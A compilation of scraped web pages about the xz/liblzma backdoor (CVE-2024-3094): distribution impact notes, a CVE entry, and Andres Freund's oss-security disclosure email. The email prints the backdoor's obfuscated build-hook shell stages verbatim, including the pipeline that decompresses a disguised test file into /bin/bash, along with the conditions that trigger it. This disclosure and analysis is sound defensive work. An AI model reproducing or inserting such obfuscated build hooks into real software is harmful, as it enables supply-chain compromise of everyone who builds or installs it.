While serious, the impact may be limited. The problematic code is in the newer versions of xz/liblzma, so it may not be as widely deployed. Linux distributions that have not yet released the newer versions are less likely to be affected.

Red Hat: Vulnerable packages are present in Fedora 41 and Fedora Rawhide. No versions of Red Hat Enterprise Linux (RHEL) are affected. Red Hat says users should immediately stop using the affected versions until the company has had a chance to change the xz version.

SUSE: An [update is available](https://build.opensuse.org/request/show/1163302) for openSUSE (Tumbleweed or MicroOS).

Debian Linux: No stable versions of the distribution are affected, but compromised packages were part of the testing, unstable, and experimental versions. Users should [update xz-utils](https://lists.debian.org/debian-security-announce/2024/msg00057.html).

Kali Linux: If systems were updated between March 26 and March 29, then users should [update again to get the fix](https://infosec.exchange/%40kalilinux/112180505434870941). If Kali's last update was before March 26, it is not affected by this backdoor.

Ubuntu: One of the most popular Linux distributions is unaffected as its version of xz is the older 5.4 version. No update is required.

This list will be updated as other distributions provide information.

## About the Author

[![Dark Reading Staff](https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt99b391f0439c1434/64f179af7de67f4e4300e517/285801_DR23_Graphics_Website_Author_Logo_0.jpg?width=400&auto=webp&quality=80&disable=upscale "Dark Reading Staff")](/author/dark-reading-staff)[Dark Reading Staff](/author/dark-reading-staff)

Dark Reading

Dark Reading is a leading cybersecurity media site.

[See more from Dark Reading Staff](/author/dark-reading-staff)Keep up with the latest cybersecurity threats, newly discovered vulnerabilities, data breach information, and emerging trends. Delivered daily or weekly right to your email inbox.[Subscribe](https://dr-resources.darkreading.com/free/w_defa3135/prgm.cgi)

You May Also Like

---

More InsightsWebinars

* [Securing Your Cloud Data Across the Attack Timeline](https://dr-resources.darkreading.com/c/pubRD.mpl?secure=1&sr=pp&_t=pp:&qf=w_rubr131&ch=SBX&cid=_upcoming_webinars_8.500001513&_mc=_upcoming_webinars_8.500001513)Jan 15, 2025
* [The Artificial Future Trend Micro Security Predictions for 2025](https://dr-resources.darkreading.com/c/pubRD.mpl?secure=1&sr=pp&_t=pp:&qf=w_tren86&ch=SBX&cid=_upcoming_webinars_8.500001514&_mc=_upcoming_webinars_8.500001514)Jan 16, 2025
* [Tips on Managing Cloud Security in a Hybrid Environment](https://dr-resources.darkreading.com/c/pubRD.mpl?secure=1&sr=pp&_t=pp:&qf=w_defa7708&ch=SBX&cid=_upcoming_webinars_8.500001516&_mc=_upcoming_webinars_8.500001516)Jan 29, 2025
* [How CISOs Navigate the Regulatory and Compliance Maze](https://dr-resources.darkreading.com/c/pubRD.mpl?secure=1&sr=pp&_t=pp:&qf=w_defa7709&ch=SBX&cid=_upcoming_webinars_8.500001515&_mc=_upcoming_webinars_8.500001515)Feb 26, 2025

[More Webinars](/resources?types=Webinar)Latest Articles in DR Technology

* [1Password Acquires SaaS Access Management Provider Trelica](/identity-access-management-security/1password-acqiures-saas-access-management-trelica)Jan 7, 2025|2 Min Read
* [Veracode Buys Package Analysis Technology From Phylum](/application-security/veracode-buys-package-analysis-technology-phylum)Jan 7, 2025|2 Min Read
* [Will AI Code Generators Overcome Their Insecurities This Year?](/application-security/will-ai-code-generators-overcome-their-insecurities-2025)Jan 6, 2025|6 Min Read
* [Quantum Computing Advances in 2024 Put Security In Spotlight](/cyber-risk/quantum-computing-advances-2024-security-spotlight)Dec 27, 2024|5 Min Read

[Read More DR Technology](/program/dr-technology)[![Logo](https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/blt6aed714e279eeb34/6542104467527c040a9b2014/Logo_-_Dark_Reading.svg?width=700&auto=webp&quality=80&disable=upscale "Logo")](/)
##### Discover More

[Black Hat](/program/black-hat)[Omdia](/program/omdia-cybersecurity)
##### Working With Us

[About Us](/about-us)[Advertise](/advertise)[Reprints](https://info.wrightsmedia.com/informa-licensing-reprints-request)
##### Join Us

[Newsletter Sign-Up](https://dr-resources.darkreading.com/free/w_defa3135/prgm.cgi)
##### Follow Us

[![Informa](https://eu-images.contentstack.com/v3/assets/blt6d90778a997de1cd/bltb3f56b75133715aa/674ee1ace1b5ac19f79ca74e/Informa_Logo_OneLine_Graduated_White_RGB.png?width=700&auto=webp&quality=80&disable=upscale "Informa")](https://www.informa.com)

Copyright © 2025. This website is owned and operated by Informa TechTarget, part of a global network that informs, influences and connects the world’s technology buyers and sellers. All copyright resides with them. Informa PLC’s registered office is 5 Howick Place, London SW1P 1WG. Registered in England and Wales. TechTarget, Inc.’s registered office is 275 Grove St. Newton, MA 02466.

[Home|](https://www.informatech.com/)[Cookie Policy|](/cookie-policy)[Privacy|](https://www.techtarget.com/privacy-policy/)[Terms of Use](https://www.informatech.com/terms-and-conditions/)


=== Content from www.vicarius.io_2c3f36ad_20250111_034045.html ===


 [about](/vsociety/about) [by vicarius](https://vicarius.io/) [log in](/vsociety/sign/in) [join community](/vsociety/sign/up)

* [scripts](/vsociety/posts)
* [CVEs](/vsociety/vulnerabilities)
* [apps](/vsociety/products)
* [OS](/vsociety/operating-systems)

29 Mar 2024000829
# CVE-2024-3094

10 Critical Severity

Malicious code was discovered in the upstream tarballs of xz, starting with version 5.6.0.
Through a series of complex obfuscations, the liblzma build process extracts a prebuilt object file from a disguised test file existing in the source code, which is then used to modify specific functions in the liblzma code. This results in a modified liblzma library that can be used by any software linked against this library, intercepting and modifying the data interaction with this library.

show less
## suggest your own:

xtranslationxdetectionxremediation

Related posts

### Vector

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:HApps (0)Operating Systems (0)
## xtranslations

 suggest your own xtranslation
## xdetection

 suggest your own xdetection
## xremediation

 suggest your own xremediationComments (0)submitshow 5 more repliesCVE-2024-309410 Critical Severity[write on this CVE](/vsociety/templates?cveId=CVE-2024-3094)
### Share

### Vector

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
### Tags

[#known\_vulnerability](/vsociety/search?hashtags=known_vulnerability)[#easy\_to\_exploit](/vsociety/search?hashtags=easy_to_exploit)[#confidentiality\_impact\_if\_exploited](/vsociety/search?hashtags=confidentiality_impact_if_exploited)[#integrity\_impact\_if\_exploited](/vsociety/search?hashtags=integrity_impact_if_exploited)[#availability\_impact\_if\_exploited](/vsociety/search?hashtags=availability_impact_if_exploited)[#critical\_vulnerability](/vsociety/search?hashtags=critical_vulnerability)[#exposed\_to\_RCE\_attack](/vsociety/search?hashtags=exposed_to_rce_attack)[#new\_vulnerability\_published](/vsociety/search?hashtags=new_vulnerability_published)[#CVE-2024-3094](/vsociety/search?hashtags=cve-2024-3094)
### Vulnerability categories

Embedded Malicious Code
### Advisory links

Comments (0)submitshow 5 more replies

Democratizing infosec research for a more secure society. Be a part of the movement.

##### about

* [An Origin Story: vsociety](/vsociety/posts/an-origin-story-vsociety)
* [Frequently Asked Questions](/vsociety/faq)
##### be Part

* [Join Community](/vsociety/sign/up)
* [Login](/vsociety/sign/in)
##### legal

* [Privacy Policy](/vsociety/privacy-policy)
* [Terms of Use](/vsociety/terms)

Copyright © Vicarius 2022. [Privacy Policy](https://www.vicarius.io/privacy) and [Terms of Use](/vsociety/terms)



=== Content from www.openwall.com_5db275b6_20250111_034001.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](3) [[next>]](5) [[thread-next>]](5) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240329155126.kjjfduxw2yrlxgzm@awork3.anarazel.de>
Date: Fri, 29 Mar 2024 08:51:26 -0700
From: Andres Freund <andres@...razel.de>
To: oss-security@...ts.openwall.com
Subject: backdoor in upstream xz/liblzma leading to ssh server compromise

Hi,

After observing a few odd symptoms around liblzma (part of the xz package) on
Debian sid installations over the last weeks (logins with ssh taking a lot of
CPU, valgrind errors) I figured out the answer:

The upstream xz repository and the xz tarballs have been backdoored.

At first I thought this was a compromise of debian's package, but it turns out
to be upstream.

== Compromised Release Tarball ==

One portion of the backdoor is *solely in the distributed tarballs*. For
easier reference, here's a link to debian's import of the tarball, but it is
also present in the tarballs for 5.6.0 and 5.6.1:

<https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63>

That line is *not* in the upstream source of build-to-host, nor is
build-to-host used by xz in git.  However, it is present in the tarballs
released upstream, except for the "source code" links, which I think github
generates directly from the repository contents:

<https://github.com/tukaani-project/xz/releases/tag/v5.6.0>
<https://github.com/tukaani-project/xz/releases/tag/v5.6.1>

This injects an obfuscated script to be executed at the end of configure. This
script is fairly obfuscated and data from "test" .xz files in the repository.

This script is executed and, if some preconditions match, modifies
$builddir/src/liblzma/Makefile to contain

am__test = bad-3-corrupt_lzma2.xz
...
am__test_dir=$(top_srcdir)/tests/files/$(am__test)
...
sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1

which ends up as
...; sed rpath ../../../tests/files/bad-3-corrupt_lzma2.xz | tr "	 \-_" " 	_\-" | xz -d | /bin/bash >/dev/null 2>&1; ...

Leaving out the "| bash" that produces

####Hello####
#��Z�.hj�
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
####World####

After de-obfuscation this leads to the attached injected.txt.

== Compromised Repository ==

The files containing the bulk of the exploit are in an obfuscated form in
  tests/files/bad-3-corrupt_lzma2.xz
  tests/files/good-large_compressed.lzma
committed upstream. They were initially added in
<https://github.com/tukaani-project/xz/commit/cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0>

Note that the files were not even used for any "tests" in 5.6.0.

Subsequently the injected code (more about that below) caused valgrind errors
and crashes in some configurations, due the stack layout differing from what
the backdoor was expecting.  These issues were attempted to be worked around
in 5.6.1:

<https://github.com/tukaani-project/xz/commit/e5faaebbcf02ea880cfc56edc702d4f7298788ad>
<https://github.com/tukaani-project/xz/commit/72d2933bfae514e0dbb123488e9f1eb7cf64175f>
<https://github.com/tukaani-project/xz/commit/82ecc538193b380a21622aea02b0ba078e7ade92>

For which the exploit code was then adjusted:
<https://github.com/tukaani-project/xz/commit/6e636819e8f070330d835fce46289a3ff72a7b89>

Given the activity over several weeks, the committer is either directly
involved or there was some quite severe compromise of their
system. Unfortunately the latter looks like the less likely explanation, given
they communicated on various lists about the "fixes" mentioned above.

Florian Weimer first extracted the injected code in isolation, also attached,
liblzma_la-crc64-fast.o, I had only looked at the whole binary. Thanks!

== Affected Systems ==

The attached de-obfuscated script is invoked first after configure, where it
decides whether to modify the build process to inject the code.

These conditions include targeting only x86-64 linux:
    if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then

Building with gcc and the gnu linker
    if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
    exit 0
    fi
    if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
    exit 0
    fi
    LDv=$LD" -v"
    if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
    exit 0

Running as part of a debian or RPM package build:
    if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then

Particularly the latter is likely aimed at making it harder to reproduce the
issue for investigators.

Due to the working of the injected code (see below), it is likely the backdoor
can only work on glibc based systems.

Luckily xz 5.6.0 and 5.6.1 have not yet widely been integrated by linux
distributions, and where they have, mostly in pre-release versions.

== Observing Impact on openssh server ==

With the backdoored liblzma installed, logins via ssh become a lot slower.

time ssh nonexistant@...alhost

before:
nonexistant@...alhost: Permission denied (publickey).

before:
real	0m0.299s
user	0m0.202s
sys	0m0.006s

after:
nonexistant@...alhost: Permission denied (publickey).

real	0m0.807s
user	0m0.202s
sys	0m0.006s

openssh does not directly use liblzma. However debian and several other
distributions patch openssh to support systemd notification, and libsystemd
does depend on lzma.

Initially starting sshd outside of systemd did not show the slowdown, despite
the backdoor briefly getting invoked. This appears to be part of some
countermeasures to make analysis harder.

Observed requirements for the exploit:
a) TERM environment variable is not set
b) argv[0] needs to be /usr/sbin/sshd
c) LD_DEBUG, LD_PROFILE are not set
d) LANG needs to be set
e) Some debugging environments, like rr, appear to be detected. Plain gdb
   appears to be detected in some situations, but not others

To reproduce outside of systemd, the server can be started with a clear
environment, setting only the required variable:

env -i LANG=en_US.UTF-8 /usr/sbin/sshd -D

In fact, openssh does not need to be started as a server to observe the
slowdown:

slow:
env -i LANG=C /usr/sbin/sshd -h

(about 0.5s on my older system)

fast:
env -i LANG=C TERM=foo /usr/sbin/sshd -h
env -i LANG=C LD_DEBUG=statistics /usr/sbin/sshd -h
...

(about 0.01s on the same system)

It's possible that argv[0] other /usr/sbin/sshd also would have effect - there
are obviously lots of servers linking to libsystemd.

== Analyzing the injected code ==

I am *not* a security researcher, nor a reverse engineer.  There's lots of
stuff I have not analyzed and most of what I observed is purely from
observation rather than exhaustively analyzing the backdoor code.

To analyze I primarily used "perf record -e intel_pt//ub" to observe where
execution diverges between the backdoor being active and not. Then also gdb,
setting breakpoints before the divergence.

The backdoor initially intercepts execution by replacing the ifunc resolvers
crc32_resolve(), crc64_resolve() with different code, which calls
_get_cpuid(), injected into the code (which previously would just be static
inline functions).  In xz 5.6.1 the backdoor was further obfuscated, removing
symbol names.

These functions get resolved during startup, because sshd is built with
-Wl,-z,now, leading to all symbols being resolved early. If started with
LD_BIND_NOT=1 the backdoor does not appear to work.

Below crc32_resolve() _get_cpuid() does not do much, it just sees that a
'completed' variable is 0 and increments it, returning the normal cpuid result
(via a new _cpuid()). It gets to be more interesting during crc64_resolve().

In the second invocation crc64_resolve() appears to find various information,
like data from the dynamic linker, program arguments and environment. Then it
perform various environment checks, including those above. There are other
checks I have not fully traced.

If the above decides to continue, the code appears to be parsing the symbol
tables in memory. This is the quite slow step that made me look into the issue.

Notably liblzma's symbols are resolved before many of the other libraries,
including the symbols in the main sshd binary.  This is important because
symbols are resolved, the GOT gets remapped read-only thanks to -Wl,-z,relro.

To be able to resolve symbols in libraries that have not yet loaded, the
backdoor installs an audit hook into the dynamic linker, which can be observed
with gdb using
  watch _rtld_global_ro._dl_naudit
It looks like the audit hook is only installed for the main binary.

That hook gets called, from _dl_audit_symbind, for numerous symbols in the
main binary. It appears to wait for "RSA_public_decrypt@....plt" to be
resolved.  When called for that symbol, the backdoor changes the value of
RSA_public_decrypt@....plt to point to its own code.  It does not do this via
the audit hook mechanism, but outside of it.

For reasons I do not yet understand, it does change sym.st_value *and* the
return value of from the audit hook to a different value, which leads
_dl_audit_symbind() to do nothing - why change anything at all then?

After that the audit hook is uninstalled again.

It is possible to change the got.plt contents at this stage because it has not
(and can't yet) been remapped to be read-only.

I suspect there might be further changes performed at this stage.

== Impact on sshd ==

The prior section explains that RSA_public_decrypt@....plt was redirected to
point into the backdoor code. The trace I was analyzing indeed shows that
during a pubkey login the exploit code is invoked:

            sshd 1736357 [010] 714318.734008:          1  branches:uH:      5555555ded8c ssh_rsa_verify+0x49c (/usr/sbin/sshd) =>     5555555612d0 RSA_public_decrypt@...+0x0 (/usr/sbin/sshd)

The backdoor then calls back into libcrypto, presumably to perform normal authentication

            sshd 1736357 [010] 714318.734009:          1  branches:uH:      7ffff7c137cd [unknown] (/usr/lib/x86_64-linux-gnu/liblzma.so.5.6.0) =>     7ffff792a2b0 RSA_get0_key+0x0 (/usr/lib/x86_64-linux-gnu/libcrypto.so.3)

I have not yet analyzed precisely what is being checked for in the injected
code, to allow unauthorized access. Since this is running in a
pre-authentication context, it seems likely to allow some form of access or
other form of remote code execution.

I'd upgrade any potentially vulnerable system ASAP.

== Bug reports ==

Given the apparent upstream involvement I have not reported an upstream
bug. As I initially thought it was a debian specific issue, I sent a more
preliminary report to security@...ian.org.  Subsequently I reported the issue
to distros@. CISA was notified by a distribution.

Red Hat assigned this issue CVE-2024-3094.

== Detecting if installation is vulnerable ==

Vegard Nossum wrote a script to detect if it's likely that the ssh binary on a
system is vulnerable, attached here. Thanks!

Greetings,

Andres Freund

View attachment "[injected.txt](4/1)" of type "text/plain" (8236 bytes)

Download attachment "[liblzma_la-crc64-fast.o.gz](4/2)" of type "application/gzip" (36487 bytes)

Download attachment "[detect.sh](4/3)" of type "application/x-sh" (426 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from www.redhat.com_4a805e6c_20250111_034043.html ===

[Skip to content](#rhb-main-content)
## Featured links

* [Support](https://access.redhat.com/)
* [Documentation](https://docs.redhat.com/en)
* [Console](https://cloud.redhat.com/)
* [Developers](https://developers.redhat.com/)
* [Start a trial](/en/products/trials)
* All Red Hat
  + For customers
    - [Customer support](https://access.redhat.com/)
    - [Subscription management](https://access.redhat.com/management)
    - [Support cases](https://access.redhat.com/support/cases)
    - [Red Hat Ecosystem Catalog](https://catalog.redhat.com/)
    - [Find a partner](https://catalog.redhat.com/partners)
  + For partners
    - [Partner portal](https://connect.redhat.com/partner-admin/dashboard)
    - [Partner support](https://connect.redhat.com/en/support)
    - [Become a partner](https://connect.redhat.com/)
  + Try, buy, & sell
    - [Red Hat Marketplace](https://marketplace.redhat.com/en-us)
    - [Red Hat Store](https://www.redhat.com/en/store)
    - [Contact sales](/en/contact)
    - [Start a trial](/en/products/trials)
  + Learning resources
    - [Documentation](https://docs.redhat.com/en)
    - [Training and certification](/en/services/training-and-certification)
    - [Hybrid cloud learning hub](https://cloud.redhat.com/learn)
    - [Interactive labs](/en/interactive-labs)
    - [Learning community](https://learn.redhat.com/)
    - [Red Hat TV](https://tv.redhat.com)
  + Open source communities
    - [Global advocacy](https://access.redhat.com/accelerators)
    - [How we contribute](/en/about/our-community-contributions)
[Red Hat](/en)

* [Products](https://www.redhat.com/en/technologies/all-products)
* [Solutions](https://www.redhat.com/en/solutions)
* [Training & services](https://www.redhat.com/en/services)
* [Resources](https://www.redhat.com/en/resources)
* Partners
* [About](https://www.redhat.com/en/about)
* Explore more
### Platform products

* [Red Hat Enterprise LinuxA flexible, stable operating system to support hybrid cloud innovation.](/en/technologies/linux-platforms/enterprise-linux)
* [Red Hat OpenShiftA container platform to build, modernize, and deploy applications at scale.](/en/technologies/cloud-computing/openshift)
* [Red Hat Ansible Automation PlatformNew versionA foundation for implementing enterprise-wide automation.](/en/technologies/management/ansible)
### Try & buy

* [Start a trialAssess a product with a no-cost trial.](/en/products/trials)
* [Buy onlineBuy select products and services in the Red Hat Store.](https://www.redhat.com/en/store)
* [Integrate with major cloud providersBuy Red Hat solutions using committed spend from providers, including:
  ![Cloud providers: Amazon Web Services, Microsoft Azure, and Google Cloud](https://www.redhat.com/rhdc/managed-files/cloud-providers-2x.png)](/en/partners/certified-cloud-and-service-providers)
### Featured

* [Red Hat Enterprise Linux AI](/en/technologies/linux-platforms/enterprise-linux/ai)
* [Red Hat OpenShift AI](/en/technologies/cloud-computing/openshift/openshift-ai)
* [Red Hat OpenShift Virtualization](/en/technologies/cloud-computing/openshift/virtualization)
* [Red Hat OpenShift Service on AWS](/en/technologies/cloud-computing/openshift/aws)
* [Microsoft Azure Red Hat OpenShift](/en/technologies/cloud-computing/openshift/azure)
[See all products](/en/technologies/all-products)

* [Application platformSimplify the way you build, deploy, manage, and secure apps across the hybrid cloud.](/en/solutions/application-platform)
* [Artificial intelligenceBuild, deploy, and monitor AI models and apps with Red Hat's open source platforms.](/en/solutions/ai)
* [Edge computingDeploy workloads closer to the source with security-focused edge technology.](/en/products/edge)

* [IT automationUnite disparate tech, teams, and environments with 1 comprehensive automation platform.](/en/solutions/it-automation)
* [Linux standardizationGet consistency across operating environments with an open, flexible infrastructure.](/en/solutions/linux-standardization)

* [SecurityDeliver software using trusted platforms and real-time security scanning and remediation.](/en/solutions/trusted-software-supply-chain)
* [VirtualizationModernize operations using a single platform for virtualized and containerized workloads.](/en/solutions/virtualization)
### By industry

* [Automotive](/en/solutions/automotive)
* [Financial services](/en/solutions/financial-services)
* [Healthcare](/en/solutions/healthcare)
* [Industrial sector](/en/solutions/industrial-sector)
* [Media and entertainment](/en/solutions/media-entertainment)
* [Public sector](/en/solutions/public-sector)
* [Telecommunications](/en/solutions/telecommunications)
[Explore solutions](/en/solutions)
### [Services](/en/services)

* [Consulting](/en/services/consulting)
* [Services for AI](/en/services/consulting/red-hat-consulting-for-ai)
* [Technical Account Management](/en/services/support/technical-account-management)
### [Training & certification](/en/services/training-and-certification)

* [All courses and exams](/en/services/training/all-courses-exams)
* [All certifications](/en/services/certifications)
* [Verify a certification](https://www.redhat.com/rhtapps/services/verify/)
* [Skills assessment](https://skills.ole.redhat.com)
* [Learning subscription](/en/services/training/learning-subscription)
* [Learning community](https://learn.redhat.com/)
* [Red Hat Academy](/en/services/training/red-hat-academy)
* [FAQs](/en/services/training-and-certification/faq)
* [Connect with learning experts](/en/services/training-and-certification/contact-us)
### Featured

* [Ansible Basics: Automation Technical Overview (No cost)](/en/services/training/do007-ansible-essentials-simplicity-automation-technical-overview)
* [Containers, Kubernetes and Red Hat OpenShift Technical Overview (No cost)](/en/services/training/do080-deploying-containerized-applications-technical-overview)
* [Red Hat Enterprise Linux Technical Overview (No cost)](/en/services/training/rh024-red-hat-linux-technical-overview)
* [Red Hat Certified System Administrator exam](/en/services/training/ex200-red-hat-certified-system-administrator-rhcsa-exam)
* [Red Hat System Administration I](/en/services/training/rh124-red-hat-system-administration-i)
[Explore services](/en/services)
### Topics

* [AI](/en/topics/ai)
* [Application modernization](/en/topics/application-modernization)
* [Automation](/en/topics/automation)
* [Cloud computing](/en/topics/cloud-computing)
* [Cloud-native applications](/en/topics/cloud-native-apps)
* [Containers](/en/topics/containers)
* [DevOps](/en/topics/devops)
* [Edge computing](/en/topics/edge-computing)
* [Linux](/en/topics/linux)
* [Virtualization](/en/topics/virtualization)
* [See all topics](/en/topics)
### Articles

* [What is InstructLab?](/en/topics/ai/what-is-instructlab)
* [What are cloud services?](/en/topics/cloud-computing/what-are-cloud-services)
* [What is edge computing?](/en/topics/edge-computing/what-is-edge-computing)
* [What is hybrid cloud?](/en/topics/cloud-computing/what-is-hybrid-cloud)
* [Why build a Red Hat cloud?](/en/topics/cloud-computing/why-choose-red-hat-cloud)
* [Cloud vs. edge](/en/topics/cloud-computing/cloud-vs-edge)
* [Red Hat OpenShift vs. Kubernetes](/en/technologies/cloud-computing/openshift/red-hat-openshift-kubernetes)
* [Learning Ansible basics](/en/topics/automation/learning-ansible-tutorial)
* [What is Linux?](/en/topics/linux/what-is-linux)
### More to explore

* [Blog](/en/blog)
* [Customer success stories](/en/success-stories)
* [Events and webinars](/en/events)
* [Newsroom](/en/about/newsroom)
* [Podcasts and video series](/en/red-hat-original-series)
* [Documentation](https://docs.redhat.com/en)
* [Resource library](/en/resources)
* [Training and certification](/en/services/training-and-certification)
[Explore resources](/en/resources)
### For customers

* [Our partners](/en/partners)
* [Red Hat Ecosystem Catalog](https://catalog.redhat.com/)
* [Find a partner](https://catalog.redhat.com/partners)
### For partners

* [Partner Connect](https://connect.redhat.com)
* [Become a partner](https://connect.redhat.com/en/benefits-of-being-a-partner)
* [Training](https://connect.redhat.com/en/training)
* [Support](https://connect.redhat.com/en/support)
* [Access the partner portal](https://connect.redhat.com/partner-admin/dashboard)
### About us

* [Our company](/en/about/company)
* [How we work](/en/about/our-culture)
* [Our social impact](/en/about/community-social-responsibility)
* [Development model](/en/about/development-model)
* [Subscription model](/en/about/value-of-Red-Hat)
* [Product support](/en/services/support)
### Open source

* [Open source commitments](/en/about/open-source)
* [How we contribute](/en/about/our-community-contributions)
* [Red Hat on GitHub](https://github.com/RedHatOfficial)
### Company details

* [Analyst relations](/en/about/analysts)
* [Blog](/en/blog)
* [Locations](/en/about/office-locations)
* [Newsroom](/en/about/newsroom)
[Explore Red Hat](/en/about)[Contact us](/en/contact)For customers

* [Customer support](https://access.redhat.com/)* [Subscription management](https://access.redhat.com/management)* [Support cases](https://access.redhat.com/support/cases)* [Red Hat Ecosystem Catalog](https://catalog.redhat.com/)* [Find a partner](https://catalog.redhat.com/partners)
For partners

* [Partner portal](https://connect.redhat.com/partner-admin/dashboard)* [Partner support](https://connect.redhat.com/en/support)* [Become a partner](https://connect.redhat.com/)
Try, buy, & sell

* [Red Hat Marketplace](https://marketplace.redhat.com/en-us)* [Red Hat Store](https://www.redhat.com/en/store)* [Contact sales](/en/contact)* [Start a trial](/en/products/trials)
Learning resources

* [Documentation](https://docs.redhat.com/en)* [Training and certification](/en/services/training-and-certification) * [Hybrid cloud learning hub](https://cloud.redhat.com/learn)* [Interactive labs](/en/interactive-labs)* [Learning community](https://learn.redhat.com/)* [Red Hat TV](https://tv.redhat.com)
Open source communities

* [Global advocacy](https://access.redhat.com/accelerators)* [How we contribute](/en/about/our-community-contributions)
For you
New
### Recommendations

As you browse redhat.com, we'll recommend resources you may like. For now, try these.

---

* [All Red Hat products](/en/technologies/all-products)
* [Tech topics](/en/topics)
* [Red Hat resources](/en/resources)
![close](https://static.redhat.com/libs/redhat/rh-iconfont/latest/svg/web-icon-close.svg)[Support](https://access.redhat.com/)[Documentation](https://docs.redhat.com/en)[Console](https://cloud.redhat.com/)[Developers](https://developers.redhat.com/)[Start a trial](/en/products/trials)[Contact](/en/contact)Select a language简体中文EnglishFrançaisDeutschItaliano日本語한국어PortuguêsEspañol[Contact us](/en/contact)
English
### Select a language

* [简体中文](/zh/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [English](/en/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [Français](/fr/blog/urgent-security-alert-fedora-41-and-rawhide-users)
* [Deutsch](/de/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [Italiano](/it/blog/urgent-security-alert-fedora-41-and-rawhide-users)
* [日本語](/ja/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [한국어](/ko/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [Português](/pt-br/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [Español](/es/blog/urgent-security-alert-fedora-40-and-rawhide-users)
Select a language简体中文EnglishFrançaisDeutschItaliano日本語한국어PortuguêsEspañol![](/themes/custom/rh_base_ui/dist/img/talk-bubble.svg)

* [Products](https://www.redhat.com/en/technologies/all-products)
* [Solutions](https://www.redhat.com/en/solutions)
* [Training & services](https://www.redhat.com/en/services)
* [Resources](https://www.redhat.com/en/resources)
* Partners
* [About](https://www.redhat.com/en/about)
* [Contact us](/en/contact)

### Select a language

* [简体中文](/zh/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [English](/en/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [Français](/fr/blog/urgent-security-alert-fedora-41-and-rawhide-users)
* [Deutsch](/de/blog/urgent-security-alert-fedora-40-and-rawhide-users)
* [Italiano](/it/blog/urgent-security-alert-fedora-41-and-rawhide-users)
* [日本語](/ja/blog/urgent-security-alert-fedora-40-and-rawhide-users)
